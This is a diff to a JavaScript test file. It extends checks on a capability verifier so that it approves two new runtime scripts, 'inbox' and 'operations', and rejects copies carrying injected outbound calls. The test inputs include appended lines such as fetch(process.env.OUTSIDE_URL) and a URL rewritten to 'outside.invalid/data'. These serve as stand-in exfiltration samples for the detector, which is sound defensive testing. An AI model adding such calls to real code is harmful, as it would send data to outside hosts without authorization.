@@ -104,8 +104,14 @@ try {
   assert.throws(() => verifier.validateRuntimeManifest({ files: productionFiles, manifest: changedManifest }), /runtime manifest.*hash/i);
   const clientSource = fs.readFileSync(path.join(__dirname, '..', '.runtime/vm_debug_ci/workspace/scripts/matrix-client.js'), 'utf8');
   const supervisorSource = fs.readFileSync(path.join(__dirname, '..', '.runtime/vm_debug_ci/workspace/scripts/matrix-runtime.js'), 'utf8');
+  const inboxSource = fs.readFileSync(path.join(__dirname, '..', '.runtime/vm_debug_ci/workspace/scripts/matrix-inbox-watch.js'), 'utf8');
+  const operationsSource = fs.readFileSync(path.join(__dirname, '..', '.runtime/vm_debug_ci/workspace/scripts/stream-watch.js'), 'utf8');
   assert.strictEqual(verifier.approvedCapabilitySource('client', clientSource), true);
   assert.strictEqual(verifier.approvedCapabilitySource('supervisor', supervisorSource), true);
+  assert.strictEqual(verifier.approvedCapabilitySource('inbox', inboxSource), true);
+  assert.strictEqual(verifier.approvedCapabilitySource('operations', operationsSource), true);
+  assert.strictEqual(verifier.approvedCapabilitySource('inbox', `${inboxSource}\nfetch(process.env.OUTSIDE_URL);\n`), false);
+  assert.strictEqual(verifier.approvedCapabilitySource('operations', `${operationsSource}\nfetch(process.env.OUTSIDE_URL);\n`), false);
   assert.strictEqual(verifier.approvedCapabilitySource('client', clientSource.replace('fetch(url, {', 'fetch(new URL(process.env.OUTSIDE_URL), {')), false);
   assert.strictEqual(verifier.approvedCapabilitySource('client', clientSource.replace('for (const [key, value]', "url.href = 'https:' + '//outside.invalid/data';\n  for (const [key, value]")), false);
   assert.strictEqual(verifier.approvedCapabilitySource('supervisor', `${supervisorSource}\nfetch(process.env.OUTSIDE_URL);\n`), false);
